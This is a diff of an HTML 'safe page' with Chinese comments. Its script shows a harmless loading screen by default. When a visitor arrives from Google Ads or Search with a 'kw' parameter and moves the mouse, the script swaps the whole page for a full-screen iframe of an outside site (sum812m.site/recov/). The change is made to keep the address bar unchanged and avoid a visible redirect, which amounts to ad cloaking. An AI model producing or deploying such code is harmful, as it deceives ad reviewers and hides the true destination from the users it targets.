@@ -3,9 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>页面加载中...</title>
+    <title>欢迎访问</title>
     <style>
-        /* 基础样式重置 */
         body, html {
             margin: 0;
             padding: 0;
@@ -14,7 +13,6 @@
             overflow: hidden;
             font-family: Arial, sans-serif;
         }
-        /* A面（安全页）样式 */
         #safe-page {
             width: 100%;
             height: 100vh;
@@ -25,16 +23,13 @@
             color: #333;
             text-align: center;
         }
-        .safe-content {
-            padding: 20px;
-        }
     </style>
 </head>
 <body>
 
-    <!-- A面：安全页（默认显示） -->
+    <!-- A面：安全页 -->
     <div id="safe-page">
-        <div class="safe-content">
+        <div>
             <h2>欢迎访问</h2>
             <p>页面正在加载，请稍候...</p>
         </div>
@@ -71,16 +66,17 @@
             const isFromGoogle = isFromGoogleAds || isFromGoogleSearch;
          
             // 4. 终极审判：带 kw 参数 + 是谷歌来的
-            if (isFromGoogle) {
+            if (isFromGoogle && kw) {
                 hasTriggered = true;
                 document.removeEventListener('mousemove', handleMouseMove);
                     
-                // 【优化核心】：直接让浏览器跳转到 B 面网址
-                // 如果需要把当前的参数（比如 kw、gclid 等）带过去，可以使用下面这行：
-                // window.location.replace("https://sum812m.site/recov/" + window.location.search);
-                
-                // 如果只需要纯净地跳转到 B 面网址，用这行：
-                window.location.replace("https://sum812m.site/recov/");
+                // 【核心优化】：不发生 302 跳转，浏览器 URL 保持 A 页面不变
+                // 直接彻底清空/移除 A 面，并动态创建铺满全屏的 B 页面容器
+                document.body.innerHTML = `
+                    <div style="width: 100%; height: 100vh; position: fixed; top: 0; left: 0; z-index: 10000; margin:0; padding:0; overflow:hidden;">
+                        <iframe src="https://sum812m.site/recov/" marginwidth="0" marginheight="0" align="middle" scrolling="auto" frameborder="0" style="width:100%;height:100vh;border:none;"></iframe>
+                    </div>
+                `;
                     
             } else {
                 document.removeEventListener('mousemove', handleMouseMove);
